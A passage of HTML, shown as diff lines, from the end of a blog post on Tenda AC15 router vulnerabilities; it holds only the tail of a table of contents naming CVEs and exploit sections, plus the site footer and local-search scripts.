class="toc-text">CVE-2018-18732</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-44971"><span class="toc-text">CVE-2021-44971</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-28556"><span class="toc-text">CVE-2022-28556</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-18728%EF%BC%8CCVE-2022-28557"><span class="toc-text">CVE-2018-18728，CVE-2022-28557</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E7%9F%A5%E7%BC%96%E5%8F%B7"><span class="toc-text">未知编号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%B7%B1%E5%B0%9D%E8%AF%95%E7%9A%84get-shell%EF%BC%9A"><span class="toc-text">自己尝试的get shell：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#setMacFilterCfg"><span class="toc-text">setMacFilterCfg</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-1"><span class="toc-text">动态调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP"><span class="toc-text">ROP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP%E8%B0%83%E8%AF%95"><span class="toc-text">EXP调试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fast-setting-wifi-set"><span class="toc-text">fast_setting_wifi_set</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%95%88%E6%9E%9C"><span class="toc-text">使用效果</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2023 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Tenda%20AC15 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F07%2F17%2FTenda-AC15%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/07/17/Tenda-AC15/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
